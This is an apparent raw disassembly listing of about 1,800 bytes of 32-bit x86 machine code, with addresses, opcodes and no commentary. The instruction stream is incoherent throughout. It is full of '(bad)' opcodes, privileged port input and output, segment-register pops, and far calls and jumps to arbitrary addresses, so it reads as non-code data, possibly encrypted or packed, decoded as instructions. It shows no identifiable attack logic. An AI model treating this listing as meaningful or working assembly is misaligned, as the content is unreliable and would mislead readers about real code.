  40b515:	dec    ecx
  40b516:	mov    dl,0xa9
  40b518:	add    al,0xb5
  40b51a:	xchg   DWORD PTR [ebx-0x74902bb],ecx
  40b520:	xchg   DWORD PTR [edx],ebp
  40b522:	push   esp
  40b523:	cmp    ebp,edi
  40b525:	mov    edx,0x6c00482b
  40b52a:	pop    ds
  40b52b:	(bad)  
  40b52c:	ss and al,0x93
  40b52f:	in     eax,dx
  40b530:	sub    ch,BYTE PTR [edx+0x4a626afa]
  40b536:	xor    BYTE PTR [eax+ecx*1],dl
  40b539:	imul   di,WORD PTR [edx-0x6d],0x4f3d
  40b53f:	inc    edi
  40b540:	jae    0x40b5b4
  40b542:	cs push ds
  40b544:	retw   
  40b546:	mov    DWORD PTR [edx+0x6e],edi
  40b549:	je     0x40b5ac
  40b54b:	jb     0x40b52a
  40b54d:	scas   eax,DWORD PTR es:[edi]
  40b54e:	in     eax,0xaa
  40b550:	sub    DWORD PTR [edi+0x35],0x99b0a01d
  40b557:	mov    bl,0x8a
  40b559:	mov    cl,0x25
  40b55b:	fsubr  st(0),st
  40b55d:	ins    BYTE PTR es:[edi],dx
  40b55e:	or     DWORD PTR [ebx+0x43],esi
  40b561:	push   ecx
  40b562:	xor    DWORD PTR [edx],edi
  40b564:	scas   eax,DWORD PTR es:[edi]
  40b565:	cld    
  40b566:	add    eax,ebp
  40b568:	lea    ebx,[ebx]
  40b56a:	jg     0x40b5d5
  40b56c:	mov    esi,0xb77383cb
  40b571:	aas    
  40b572:	jns    0x40b563
  40b574:	push   0x59740a7f
  40b579:	stos   DWORD PTR es:[edi],eax
  40b57a:	push   ebp
  40b57b:	and    DWORD PTR [esi+0x9e58352],eax
  40b581:	xor    eax,0x6615ef2c
  40b586:	sbb    DWORD PTR [ebx+0x33],edi
  40b589:	lds    ecx,FWORD PTR [esi+0x68b78353]
  40b58f:	test   DWORD PTR [ebp+0x2b3754df],ebp
  40b595:	mov    dh,0x18
  40b597:	dec    ebp
  40b598:	dec    ebx
  40b599:	xlat   BYTE PTR ds:[ebx]
  40b59a:	(bad)  
  40b59c:	or     BYTE PTR [esp+eiz*8],ch
  40b59f:	aad    0x61
  40b5a1:	mov    BYTE PTR [esi],al
  40b5a3:	mov    al,0x42
  40b5a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5a6:	pop    esp
  40b5a7:	mov    ecx,DWORD PTR [ebx+0x40]
  40b5aa:	mov    edx,0x7c3b2be2
  40b5af:	fchs   
  40b5b1:	mov    ds:0x47e2cdbc,al
  40b5b6:	cmp    BYTE PTR [edx],ch
  40b5b8:	shr    DWORD PTR [ecx+0x79],cl
  40b5bb:	lods   eax,DWORD PTR ds:[esi]
  40b5bc:	icebp  
  40b5bd:	xor    al,0x4a
  40b5bf:	mov    edi,0x5030df9d
  40b5c4:	mov    dl,0x7f
  40b5c6:	dec    ebp
  40b5c7:	(bad)  
  40b5c8:	xlat   BYTE PTR ds:[ebx]
  40b5c9:	add    eax,0x53267711
  40b5ce:	jbe    0x40b56a
  40b5d0:	mov    ecx,0xf5cddf9e
  40b5d5:	xchg   edx,eax
  40b5d6:	mov    BYTE PTR [ecx],ch
  40b5d8:	jbe    0x40b602
  40b5da:	mov    BYTE PTR [eax+0x18fa8823],dl
  40b5e0:	jnp    0x40b5e3
  40b5e2:	xchg   eax,edi
  40b5e4:	out    0x3b,al
  40b5e6:	sbb    ecx,edi
  40b5e8:	pushf  
  40b5e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5ea:	push   0xfe4f1f01
  40b5ef:	clc    
  40b5f0:	pusha  
  40b5f1:	out    0xaa,eax
  40b5f3:	dec    esi
  40b5f4:	imul   ebp,DWORD PTR [esi],0xfffffffc
  40b5f7:	fs jmp 0x40b582
  40b5fa:	mov    ebp,0xbde9ccc1
  40b5ff:	push   es
  40b600:	gs mov cl,0x4c
  40b603:	out    0xce,al
  40b605:	int3   
  40b606:	fcomp  QWORD PTR [edx+0x8]
  40b609:	cmp    ecx,0xa899ce25
  40b60f:	mov    ch,0x5f
  40b611:	daa    
  40b612:	mov    edx,0x4a50fb31
  40b617:	and    al,0xf7
  40b619:	popa   
  40b61a:	mov    ds:0x9bab556e,al
  40b61f:	xchg   edi,eax
  40b620:	daa    
  40b621:	xchg   DWORD PTR [ecx],edi
  40b623:	outs   dx,BYTE PTR ds:[esi]
  40b624:	ins    DWORD PTR es:[edi],dx
  40b625:	jno    0x40b656
  40b627:	push   edi
  40b628:	pop    ebx
  40b629:	mov    BYTE PTR [esi-0x6d],dh
  40b62c:	(bad)  
  40b62d:	retf   
  40b62e:	mov    eax,ds:0xe5eecf0a
  40b633:	add    ebp,0x9048efe2
  40b639:	sub    al,0xba
  40b63b:	add    eax,0xc75e3e10
  40b640:	push   cs
  40b641:	pop    edi
  40b642:	cli    
  40b643:	mov    eax,ds:0x1228e100
  40b648:	rcl    BYTE PTR [esi],cl
  40b64a:	xlat   BYTE PTR ds:[ebx]
  40b64b:	and    al,0xe
  40b64d:	out    0x84,eax
  40b64f:	push   ecx
  40b650:	and    eax,0x39017112
  40b655:	mov    eax,DWORD PTR [edx-0x3]
  40b658:	scas   al,BYTE PTR es:[edi]
  40b659:	or     ebp,edi
  40b65b:	jecxz  0x40b607
  40b65d:	lahf   
  40b65e:	out    0x1,al
  40b660:	je     0x40b6c3
  40b662:	cmc    
  40b663:	push   edi
  40b664:	sub    eax,0xc050dd81
  40b669:	xchg   esi,eax
  40b66a:	dec    ebx
  40b66b:	xchg   ebp,eax
  40b66c:	jp     0x40b6d1
  40b66e:	mov    ah,dl
  40b670:	(bad)  
  40b671:	cmp    eax,0x914afea2
  40b676:	sub    al,0xb2
  40b678:	cs gs sbb eax,0x1fb56a06
  40b67f:	call   0xe900a00c
  40b684:	test   DWORD PTR [edx],0x42b7708b
  40b68a:	mov    esi,0xf8084b53
  40b68f:	add    ebp,DWORD PTR [edi+edx*4-0x16]
  40b693:	pop    ecx
  40b694:	mov    cl,0x61
  40b696:	shl    BYTE PTR [ecx+edx*2+0x44],0x10
  40b69b:	aad    0x67
  40b69d:	mov    esi,0x34aff515
  40b6a2:	js     0x40b719
  40b6a4:	shl    BYTE PTR [bp+di-0x19],cl
  40b6a8:	or     eax,0xc7de5df1
  40b6ad:	call   0x58b9:0x22a7f143
  40b6b4:	jne    0x40b70c
  40b6b6:	fs mov ch,0x9e
  40b6b9:	sbb    ebp,DWORD PTR [edi-0x71]
  40b6bc:	loopne 0x40b6c5
  40b6be:	ret    
  40b6bf:	cs and ebp,eax
  40b6c2:	mov    esp,0xa9e0412
  40b6c7:	fdiv   st(1),st
  40b6c9:	out    dx,eax
  40b6ca:	sub    dh,dh
  40b6cc:	push   ds
  40b6cd:	add    edx,eax
  40b6cf:	icebp  
  40b6d0:	psubq  mm3,QWORD PTR [eax+0x51]
  40b6d4:	cld    
  40b6d5:	sbb    esi,esp
  40b6d7:	inc    esp
  40b6d8:	daa    
  40b6d9:	jecxz  0x40b758
  40b6db:	xchg   DWORD PTR [ecx-0xc8d25a1],ebp
  40b6e1:	mov    esp,DWORD PTR [edi+ebx*4-0xf090b56]
  40b6e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6e9:	fld    st(6)
  40b6eb:	icebp  
  40b6ec:	fcomip st,st(3)
  40b6ee:	xchg   ebx,eax
  40b6ef:	imul   eax,ebp,0xe42213d0
  40b6f5:	add    al,0x54
  40b6f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6f8:	addr16 daa 
  40b6fa:	mov    bh,0xf
  40b6fc:	ja     0x40b6ef
  40b6fe:	test   eax,0x59c6f15a
  40b703:	es pop ss
  40b705:	mov    ds:0x2fc9fbdc,eax
  40b70a:	and    dh,bh
  40b70c:	retf   
  40b70d:	sbb    bh,BYTE PTR [eax+0x4b]
  40b710:	in     eax,dx
  40b711:	inc    edi
  40b712:	push   esi
  40b713:	je     0x40b708
  40b715:	jne    0x40b720
  40b717:	ror    BYTE PTR [ebp+0x7ece0867],1
  40b71d:	sar    BYTE PTR [edx+0x100cfcec],1
  40b723:	jecxz  0x40b70a
  40b725:	js     0x40b76b
  40b727:	and    bh,BYTE PTR [ecx+0xe539b16]
  40b72d:	sar    BYTE PTR [esi-0x6d],0x36
  40b731:	aam    0xb5
  40b733:	xor    DWORD PTR [ebp-0x4371304],esp
  40b739:	repz jl 0x40b6f9
  40b73c:	aam    0xa9
  40b73e:	stos   BYTE PTR es:[edi],al
  40b73f:	sub    dh,BYTE PTR [edi-0x6edc60b7]
  40b745:	inc    ecx
  40b746:	pop    eax
  40b747:	aam    0x8e
  40b749:	push   edx
  40b74a:	lahf   
  40b74b:	xor    DWORD PTR [edx+0xcffcdee],ecx
  40b751:	aad    0xb5
  40b753:	adc    ebp,ebx
  40b755:	arpl   WORD PTR [edi+eax*8+0x11fa926a],bx
  40b75c:	xor    ebx,edx
  40b75e:	mov    dh,0xb6
  40b760:	cmp    bh,0x14
  40b763:	push   ss
  40b764:	cmp    DWORD PTR [ebx+0x47],ebx
  40b767:	(bad)  
  40b768:	sub    eax,ecx
  40b76a:	std    
  40b76b:	pop    eax
  40b76c:	pop    ebx
  40b76d:	mov    ecx,0x369379ae
  40b772:	sub    bh,dh
  40b774:	xor    BYTE PTR [edi],ah
  40b776:	pop    edx
  40b777:	out    0x6b,al
  40b779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b77a:	dec    DWORD PTR [edi]
  40b77c:	sub    cl,BYTE PTR [edx+0x37]
  40b77f:	xchg   edi,eax
  40b780:	push   eax
  40b781:	mov    dh,0x92
  40b783:	push   ss
  40b784:	leave  
  40b785:	push   edx
  40b786:	xor    al,0xd1
  40b788:	or     eax,0x94e21330
  40b78d:	cmc    
  40b78e:	jae    0x40b7f2
  40b790:	jbe    0x40b749
  40b792:	stos   DWORD PTR es:[edi],eax
  40b793:	cld    
  40b794:	and    BYTE PTR [ebx+eiz*4-0x2],0x7a
  40b799:	call   0xfc45917f
  40b79e:	imul   edx,esi,0x65
  40b7a1:	lods   al,BYTE PTR ds:[esi]
  40b7a2:	xchg   esp,eax
  40b7a3:	sub    edi,DWORD PTR [edx-0x2551628f]
  40b7a9:	or     eax,0xed4e5c48
  40b7ae:	(bad)  
  40b7af:	(bad)  
  40b7b0:	mov    eax,0x4f0acf20
  40b7b5:	mov    esi,0x30eeea1c
  40b7ba:	stos   BYTE PTR es:[edi],al
  40b7bb:	int    0xc
  40b7bd:	push   edi
  40b7be:	ins    BYTE PTR es:[edi],dx
  40b7bf:	xlat   BYTE PTR ds:[ebx]
  40b7c0:	jno    0x40b78d
  40b7c2:	shl    esp,0x37
  40b7c5:	xchg   esp,eax
  40b7c6:	jp     0x40b7c4
  40b7c8:	mul    DWORD PTR [eax-0x7]
  40b7cb:	in     al,dx
  40b7cc:	xchg   esp,eax
  40b7cd:	jl     0x40b810
  40b7cf:	imul   esp,ebx,0xffffff93
  40b7d2:	(bad)  
  40b7d3:	jnp    0x40b7cc
  40b7d5:	mov    bh,BYTE PTR [eax]
  40b7d7:	loope  0x40b7ed
  40b7d9:	shl    BYTE PTR [edx],0x48
  40b7dc:	lods   al,BYTE PTR ds:[esi]
  40b7dd:	and    ebx,DWORD PTR [edx+0x14]
  40b7e0:	test   al,0x31
  40b7e2:	pusha  
  40b7e3:	xchg   edi,eax
  40b7e4:	rol    DWORD PTR [eax],1
  40b7e6:	scas   al,BYTE PTR es:[edi]
  40b7e7:	jmp    DWORD PTR ds:0xc5f95800
  40b7ed:	mov    al,ds:0x5d335369
  40b7f2:	sub    eax,0x4107d84c
  40b7f7:	push   eax
  40b7f8:	cmc    
  40b7f9:	gs pop esp
  40b7fb:	mov    cs:0xac6fca03,al
  40b801:	or     edx,0x53
  40b804:	ffreep st(1)
  40b806:	push   ds
  40b807:	repz (bad) 
  40b809:	iret   
  40b80a:	sbb    dh,BYTE PTR [eax+ecx*4+0x4]
  40b80e:	js     0x40b79b
  40b810:	inc    ecx
  40b811:	cli    
  40b812:	pushf  
  40b813:	or     ecx,ecx
  40b815:	ret    
  40b816:	jbe    0x40b7c5
  40b818:	pop    eax
  40b819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b81a:	sbb    BYTE PTR ds:0x301bc174,ch
  40b820:	sub    bh,BYTE PTR [ebx]
  40b822:	push   edi
  40b823:	sub    bl,BYTE PTR [ecx+0x4b]
  40b826:	cmp    BYTE PTR [ebp+0x50ad2aad],ah
  40b82c:	mov    dl,0x1f
  40b82e:	retf   
  40b82f:	mov    eax,0xd05e7009
  40b834:	shl    BYTE PTR [ebp-0x46],0xb8
  40b838:	or     edx,DWORD PTR [ecx+0x23]
  40b83b:	sbb    ch,bl
  40b83d:	arpl   dx,bp
  40b83f:	adc    edi,0x69
  40b842:	(bad)  
  40b843:	mov    ebx,0x2c06b93a
  40b848:	ss pop esp
  40b84a:	pop    esi
  40b84b:	loop   0x40b8ca
  40b84d:	lods   al,BYTE PTR ds:[esi]
  40b84e:	(bad)  
  40b84f:	leave  
  40b850:	mov    ebx,0xd0b49302
  40b855:	pop    esp
  40b856:	push   ebx
  40b857:	int3   
  40b858:	xlat   BYTE PTR ds:[ebx]
  40b859:	jg     0x40b808
  40b85b:	rcl    DWORD PTR [esi-0xf46e1ec],cl
  40b861:	add    al,0x6f
  40b863:	dec    edi
  40b864:	dec    ecx
  40b865:	jecxz  0x40b883
  40b867:	push   ebx
  40b868:	add    edx,DWORD PTR [edi+0x3eb0fefc]
  40b86e:	fcom   QWORD PTR fs:[ebp-0x33c519d8]
  40b875:	xchg   ebp,eax
  40b876:	lods   al,BYTE PTR ds:[esi]
  40b877:	stos   BYTE PTR es:[edi],al
  40b878:	jo     0x40b85e
  40b87a:	mov    esi,0xbaba9360
  40b87f:	mov    al,0x12
  40b881:	or     eax,0x6b5ad637
  40b886:	jb     0x40b850
  40b888:	hlt    
  40b889:	int    0x3d
  40b88b:	pop    ds
  40b88c:	push   0xad3816b3
  40b891:	adc    al,0x8
  40b893:	cs stos BYTE PTR es:[edi],al
  40b895:	enter  0x4452,0xb6
  40b899:	cdq    
  40b89a:	bound  edi,QWORD PTR [ebp+0x31ea6118]
  40b8a0:	pop    ecx
  40b8a1:	inc    edi
  40b8a2:	cwde   
  40b8a3:	sub    BYTE PTR [edx+0x37],0xef
  40b8a7:	stos   BYTE PTR es:[edi],al
  40b8a8:	jmp    0x40b90e
  40b8aa:	inc    edx
  40b8ab:	iret   
  40b8ac:	jge    0x40b879
  40b8ae:	xor    DWORD PTR [ebp+0x6ab80df4],eax
  40b8b4:	dec    ebx
  40b8b5:	sbb    al,0xeb
  40b8b7:	xchg   ebx,ebp
  40b8b9:	ret    
  40b8ba:	test   DWORD PTR [ebx-0x29],edi
  40b8bd:	inc    esp
  40b8be:	pop    ecx
  40b8bf:	out    0x86,eax
  40b8c1:	mov    cl,BYTE PTR [edi-0x5b]
  40b8c4:	mov    ecx,cs
  40b8c6:	aas    
  40b8c7:	jecxz  0x40b8a8
  40b8c9:	nop
  40b8ca:	push   0xf9ea7160
  40b8cf:	or     al,0x4d
  40b8d1:	sub    bh,bl
  40b8d3:	push   es
  40b8d4:	jno    0x40b8fe
  40b8d6:	dec    edx
  40b8d7:	mov    bl,BYTE PTR [ebx+0x4337efb5]
  40b8dd:	pop    eax
  40b8de:	rcr    DWORD PTR ds:[ecx-0x3d19e845],cl
  40b8e5:	or     eax,0xf78957cf
  40b8ea:	hlt    
  40b8eb:	cld    
  40b8ec:	fwait
  40b8ed:	adc    al,ah
  40b8ef:	xchg   edx,eax
  40b8f0:	aas    
  40b8f1:	lods   al,BYTE PTR ds:[esi]
  40b8f2:	jecxz  0x40b8d0
  40b8f4:	xchg   esp,eax
  40b8f5:	fild   DWORD PTR [ebx+0x6a]
  40b8f8:	add    bl,bl
  40b8fa:	test   ah,dl
  40b8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8fd:	nop
  40b8fe:	out    dx,eax
  40b8ff:	xor    BYTE PTR [ebx-0x23aadad7],ah
  40b905:	or     ebp,DWORD PTR [eax]
  40b907:	pop    ecx
  40b908:	pop    eax
  40b909:	mov    eax,0x28d91cd9
  40b90e:	in     eax,dx
  40b90f:	mov    DWORD PTR [ecx],edi
  40b911:	inc    ecx
  40b912:	push   ebp
  40b913:	fdiv   QWORD PTR [ebp+0x40]
  40b916:	fdiv   QWORD PTR [ecx-0x29]
  40b919:	sub    DWORD PTR [eax+0x2c2b371a],esi
  40b91f:	outs   dx,DWORD PTR ds:[esi]
  40b920:	xchg   edi,eax
  40b921:	rcl    DWORD PTR [ebx],0x4a
  40b924:	mov    DWORD PTR [edi],ebx
  40b926:	retf   0xccd1
  40b929:	dec    ebx
  40b92a:	push   0xfffffffd
  40b92c:	pop    edx
  40b92d:	pop    es
  40b92e:	pop    ebp
  40b92f:	lods   al,BYTE PTR ds:[esi]
  40b930:	enter  0xec55,0xa0
  40b934:	dec    eax
  40b935:	aam    0x52
  40b937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b938:	cmp    dh,0x5b
  40b93b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b93c:	and    BYTE PTR ds:0xd54fbf1,cl
  40b942:	xchg   esp,eax
  40b943:	cs and eax,0xdae85075
  40b949:	sbb    DWORD PTR [esi-0x77],0xffffffda
  40b94d:	cli    
  40b94e:	inc    ebp
  40b94f:	ror    BYTE PTR [eax],cl
  40b951:	(bad)  
  40b952:	fisubr DWORD PTR [esp+ebx*2+0x73]
  40b956:	fsubr  DWORD PTR [ebx]
  40b958:	dec    ebp
  40b959:	sbb    dh,BYTE PTR ds:[ecx]
  40b95c:	mov    bh,0xab
  40b95e:	ja     0x40b9df
  40b960:	popa   
  40b961:	xchg   DWORD PTR [edi+0x347fdc87],esi
  40b967:	jle    0x40b99d
  40b969:	(bad)  
  40b96a:	ffreep st(3)
  40b96c:	push   edi
  40b96d:	dec    eax
  40b96e:	or     ebx,esi
  40b970:	mov    ah,0xbb
  40b972:	jnp    0x40b914
  40b974:	inc    edx
  40b975:	sbb    BYTE PTR [ecx-0x1ac00498],ah
  40b97b:	(bad)  
  40b97c:	rol    DWORD PTR [ebx+0x20a04ea0],cl
  40b982:	adc    ah,ch
  40b984:	mov    edx,0x3474c50
  40b989:	xchg   esp,eax
  40b98a:	inc    edi
  40b98b:	sub    al,0x62
  40b98d:	jbe    0x40ba04
  40b98f:	mov    cl,BYTE PTR [ebp-0x41]
  40b992:	(bad)  
  40b993:	push   eax
  40b994:	test   al,0x5b
  40b996:	idiv   al
  40b998:	imul   ebx,DWORD PTR [esi+0xa],0x25bcf9de
  40b99f:	sub    BYTE PTR [eax-0x68],bh
  40b9a2:	jl     0x40b9b8
  40b9a4:	test   eax,0xf1a7937f
  40b9a9:	std    
  40b9aa:	std    
  40b9ab:	and    BYTE PTR [edi-0xb],bh
  40b9ae:	stos   BYTE PTR es:[edi],al
  40b9af:	cmc    
  40b9b0:	(bad)  
  40b9b1:	cld    
  40b9b2:	xchg   esp,eax
  40b9b3:	ficom  DWORD PTR [edx-0x1f]
  40b9b6:	pop    es
  40b9b7:	loope  0x40b9ea
  40b9b9:	js     0x40b981
  40b9bb:	sub    DWORD PTR [edx],esi
  40b9bd:	popa   
  40b9be:	jle    0x40b967
  40b9c0:	(bad)  
  40b9c1:	imul   BYTE PTR [edi+0x30]
  40b9c4:	out    dx,eax
  40b9c5:	jae    0x40b989
  40b9c7:	loopne 0x40b98d
  40b9c9:	fninit 
  40b9cb:	in     al,dx
  40b9cc:	aaa    
  40b9cd:	daa    
  40b9ce:	jp     0x40b9de
  40b9d0:	lahf   
  40b9d1:	in     eax,0xeb
  40b9d3:	ret    0x6d33
  40b9d6:	outs   dx,DWORD PTR ds:[esi]
  40b9d7:	stc    
  40b9d8:	es mov ch,0x7d
  40b9db:	jmp    0x2f7b0b28
  40b9e0:	imul   ebx,DWORD PTR [ebp+0x62aa63e5],0xd7326e28
  40b9ea:	xchg   esp,eax
  40b9eb:	mov    ds:0x1d857fc,al
  40b9f0:	fbstp  TBYTE PTR [edi+0x3710c5b6]
  40b9f6:	xchg   BYTE PTR [edi+0x1e],al
  40b9f9:	fnstcw WORD PTR [edi+0x6c]
  40b9fc:	sbb    BYTE PTR [edx+edx*8-0x7f],cl
  40ba00:	fstp   QWORD PTR [ecx+ebx*4-0x47]
  40ba04:	daa    
  40ba05:	lods   eax,DWORD PTR ds:[esi]
  40ba06:	sub    DWORD PTR [esi+edi*2+0x33041213],0x1e64cd3a
  40ba11:	repnz or eax,0x228314f2
  40ba17:	adc    al,0xdf
  40ba19:	cmp    ebp,DWORD PTR [ebp-0x362e42f6]
  40ba1f:	mov    eax,0xfeac305b
  40ba24:	in     eax,dx
  40ba25:	cli    
  40ba26:	cmp    dh,cl
  40ba28:	mov    al,ds:0x8e37b10a
  40ba2d:	sahf   
  40ba2e:	add    esi,ecx
  40ba30:	call   0x20dc2ad3
  40ba35:	aaa    
  40ba36:	(bad)  
  40ba37:	(bad)  
  40ba38:	add    DWORD PTR [edx+0x59],ecx
  40ba3b:	fwait
  40ba3c:	mov    bl,0xd4
  40ba3e:	xchg   edi,eax
  40ba3f:	je     0x40ba0b
  40ba41:	hlt    
  40ba42:	cmp    dl,cl
  40ba44:	pop    ebx
  40ba45:	sub    dl,dh
  40ba47:	mov    al,ds:0x99e935c7
  40ba4c:	cwde   
  40ba4d:	popa   
  40ba4e:	iret   
  40ba4f:	mov    ah,0x9c
  40ba51:	cli    
  40ba52:	jmp    0x40ba5b
  40ba54:	dec    edx
  40ba55:	in     eax,0xb7
  40ba57:	mov    dh,0x40
  40ba59:	loopne 0x40ba30
  40ba5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba5c:	add    ecx,DWORD PTR [eax]
  40ba5e:	leave  
  40ba5f:	xchg   edi,eax
  40ba60:	sbb    eax,0x161c54ae
  40ba65:	sub    edx,DWORD PTR [edi]
  40ba67:	retf   0xd8f5
  40ba6a:	in     al,dx
  40ba6b:	ins    DWORD PTR es:[edi],dx
  40ba6c:	cmp    edx,DWORD PTR ds:0x45f2ad8b
  40ba72:	imul   BYTE PTR [edx]
  40ba74:	sub    al,0x55
  40ba76:	repnz mov ecx,0xdf077592
  40ba7c:	pop    ss
  40ba7d:	xchg   ebp,eax
  40ba7e:	mov    ebx,0xb743e12f
  40ba83:	std    
  40ba84:	and    eax,0x2e4fb54b
  40ba89:	in     al,0x1a
  40ba8b:	pop    ss
  40ba8c:	pop    esp
  40ba8d:	cwde   
  40ba8e:	inc    ebx
  40ba8f:	fld    TBYTE PTR [ebx]
  40ba91:	dec    esi
  40ba92:	mov    ds:0xaa6b736a,eax
  40ba97:	shl    DWORD PTR ss:[eax+0x70],0xd4
  40ba9c:	pop    eax
  40ba9d:	adc    dl,BYTE PTR [esi-0x575df92c]
  40baa3:	stos   BYTE PTR es:[edi],al
  40baa4:	push   ecx
  40baa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baa6:	mov    al,ds:0xdf20a177
  40baab:	out    dx,al
  40baac:	int3   
  40baad:	test   ebp,ebx
  40baaf:	and    BYTE PTR [edx-0x16],dh
  40bab2:	or     al,0xe9
  40bab4:	in     eax,0x8a
  40bab6:	jmp    0xb7c7f1ea
  40babb:	pop    eax
  40babc:	neg    BYTE PTR [ebx-0x65f1645d]
  40bac2:	mov    ebx,0xf235c66d
  40bac7:	dec    ebx
  40bac8:	dec    ebp
  40bac9:	mov    dl,0xe4
  40bacb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bacc:	stos   DWORD PTR es:[edi],eax
  40bacd:	push   ss
  40bace:	dec    edx
  40bacf:	inc    ebx
  40bad0:	sar    DWORD PTR [ebx+0x359fecb7],cl
  40bad6:	push   es
  40bad7:	xchg   edi,eax
  40bad8:	arpl   ax,si
  40bada:	dec    ebp
  40badb:	and    eax,0x27bf7a6c
  40bae0:	scas   eax,DWORD PTR es:[edi]
  40bae1:	sub    al,0x78
  40bae3:	or     ebp,DWORD PTR [ebp+0x7f]
  40bae6:	sbb    al,0x85
  40bae8:	sub    al,dh
  40baea:	sbb    al,0xb7
  40baec:	xlat   BYTE PTR ds:[ebx]
  40baed:	and    al,0x49
  40baef:	out    0x65,al
  40baf1:	ret    
  40baf2:	dec    eax
  40baf3:	rol    bh,0xbf
  40baf6:	retf   
  40baf7:	(bad)  
  40baf8:	jl     0x40bb68
  40bafa:	push   edx
  40bafb:	mov    eax,0xfc18821b
  40bb00:	repz repz add al,0x75
  40bb04:	mov    ch,0x8a
  40bb06:	sti    
  40bb07:	or     BYTE PTR [edi],ah
  40bb09:	dec    bl
  40bb0b:	cld    
  40bb0c:	es (bad) 
  40bb0e:	adc    ebx,edi
  40bb10:	fcmovu st,st(4)
  40bb12:	jg     0x40bb0f
  40bb14:	add    BYTE PTR [ecx+0x73],bh
  40bb17:	mov    dh,0x52
  40bb19:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40bb1b:	pop    ecx
  40bb1c:	in     al,0xbe
  40bb1e:	add    ecx,DWORD PTR [esi-0x732c085c]
  40bb24:	jmp    0xd35f7787
  40bb29:	jmp    0x40bb88
  40bb2b:	mov    ebx,0xd02e17f0
  40bb30:	repz pushf 
  40bb32:	stos   DWORD PTR es:[edi],eax
  40bb33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb34:	gs jnp 0x40bb28
  40bb37:	mov    cl,0x7f
  40bb39:	paddsb mm0,QWORD PTR [edi+0x1f]
  40bb3d:	adc    eax,DWORD PTR [edx-0x4e84b096]
  40bb43:	mov    edi,0x532610f2
  40bb48:	hlt    
  40bb49:	outs   dx,DWORD PTR ds:[esi]
  40bb4a:	es ja  0x40bb7d
  40bb4d:	sbb    DWORD PTR [esi+0x72],esp
  40bb50:	mov    cl,0xe4
  40bb52:	cs push ss
  40bb54:	cli    
  40bb55:	mov    edx,0xb7da1251
  40bb5a:	imul   edi,DWORD PTR [esi],0xeac5483b
  40bb60:	push   esi
  40bb61:	jno    0x40bb8e
  40bb63:	jl     0x40bb8f
  40bb65:	fcomp  QWORD PTR [ebx+0x294422ca]
  40bb6b:	adc    esi,DWORD PTR [edx-0x440c79cb]
  40bb71:	jmp    ebp
  40bb73:	mov    esi,edx
  40bb75:	push   ebp
  40bb76:	inc    edi
  40bb77:	aas    
  40bb78:	cdq    
  40bb79:	xchg   ecx,eax
  40bb7a:	fwait
  40bb7b:	mov    ebp,0xb2c2a9ae
  40bb80:	mov    edi,0x6513b9cc
  40bb85:	dec    edx
  40bb86:	dec    ecx
  40bb87:	and    al,0xd
  40bb8a:	jns    0x40bba1
  40bb8c:	jecxz  0x40bb18
  40bb8e:	ficom  DWORD PTR [eax]
  40bb90:	cmp    al,0xbe
  40bb92:	push   DWORD PTR [eax+0x4654f0b]
  40bb98:	dec    ecx
  40bb99:	fistp  QWORD PTR [esi+0x7e4cf3b]
  40bb9f:	mov    bh,0x8d
  40bba1:	test   al,0x34
  40bba3:	jl     0x40bb5e
  40bba5:	dec    ecx
  40bba6:	mov    bh,dh
  40bba8:	retf   
  40bba9:	imul   ebp,ebx,0xa84046d0
  40bbaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbb0:	fstp   DWORD PTR [esi-0x7c604a1e]
  40bbb6:	shr    cl,1
  40bbb8:	xchg   ebp,eax
  40bbb9:	mov    ds:0x48a73e86,al
  40bbbe:	lea    ecx,ds:0x1b676f5f
  40bbc4:	or     ebp,DWORD PTR [eax+0x54]
  40bbc7:	dec    esp
  40bbc8:	aas    
  40bbc9:	in     al,dx
  40bbca:	pop    ebp
  40bbcb:	sub    bh,bl
  40bbcd:	jb     0x40bc06
  40bbcf:	jecxz  0x40bc29
  40bbd1:	adc    al,0xb0
  40bbd3:	xchg   esp,eax
  40bbd4:	and    ebx,esi
  40bbd6:	add    al,0xdc
  40bbd8:	push   ebp
  40bbd9:	sar    BYTE PTR [edi+0x3b581768],cl
  40bbdf:	xlat   BYTE PTR ds:[ebx]
  40bbe0:	and    eax,0xd047fd2f
  40bbe5:	out    0xef,eax
  40bbe7:	inc    esp
  40bbe8:	adc    ebx,DWORD PTR [ebx+eiz*1+0x4ece5bfd]
  40bbef:	mov    al,0x38
  40bbf1:	ss mov bl,al
  40bbf4:	ins    DWORD PTR es:[edi],dx
  40bbf5:	xchg   ecx,eax
  40bbf6:	in     eax,0x18
  40bbf8:	pop    ebx
  40bbf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbfa:	cdq    
  40bbfb:	loopne 0x40bb9a
  40bbfd:	cmp    ebp,DWORD PTR [eax+ebp*1]
  40bc00:	daa    
  40bc01:	mov    al,0x84
  40bc03:	xchg   ebx,eax
  40bc04:	adc    eax,0xef3f5c92
  40bc09:	lds    ebp,FWORD PTR [esi-0x57]
  40bc0c:	push   cs
  40bc0d:	and    BYTE PTR [esi+0x33],dl
  40bc10:	jmp    0x40bbfe
  40bc12:	dec    edx
  40bc13:	call   0x8003:0x9f421ec8
  40bc1a:	(bad)  
  40bc1b:	sbb    BYTE PTR [eax+0x46],ah
  40bc1e:	lds    eax,FWORD PTR [edi]
  40bc20:	xchg   edx,eax
  40bc21:	int    0x27
  40bc23:	shl    BYTE PTR [edx+0x6f],0xbf
  40bc27:	(bad)  
  40bc29:	sub    edx,DWORD PTR [edi+edi*2-0x71618843]
  40bc30:	out    dx,eax
  40bc31:	pop    ecx
  40bc32:	in     al,dx
  40bc33:	add    DWORD PTR [eax+ebx*4],ebx
  40bc36:	dec    edx
